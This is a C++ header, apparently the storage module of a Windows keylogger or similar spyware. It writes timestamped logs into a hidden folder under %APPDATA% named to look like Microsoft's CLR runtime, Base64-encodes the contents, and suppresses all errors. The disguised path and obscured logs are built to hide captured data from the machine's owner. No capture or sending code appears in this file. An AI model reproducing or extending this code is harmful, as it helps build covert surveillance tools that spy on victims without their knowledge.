#ifndef IO_H
#define IO_H

#include<string>
#include<cstdlib>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
#include <fstream>



namespace IO{
    std::string GetOurPath (const bool append_separator = false){ //if the backslash is needed in the end
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_separator ? "\\" : "");
    }

    bool MkOneDR(std::string path){
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }
    /* C:\Users\tests\Downloads\ break the path and create if it does not exist*/
    bool MKDir(std::string path){
        for(char &c: path){
            if(c == '\\'){
                c= '\0';
                if(!MkOneDR(path))
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t){
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try{
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() <<  "]" << std::endl << t << std::endl;
            std::string data=Base64::EncryptB64(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...){//just only because we do not want program to crash if anything goes wrong
            return "";
        }

    }

}
#endif // IO_H

